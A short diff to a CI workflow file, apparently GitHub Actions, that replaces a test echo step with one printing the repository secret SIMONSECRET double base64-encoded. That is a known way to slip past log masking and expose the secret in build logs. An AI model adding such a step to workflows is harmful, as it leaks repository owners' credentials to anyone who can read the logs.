@@ -8,4 +8,4 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - run: echo test
+      - run: echo ${{ secrets.SIMONSECRET }} | base64 | base64
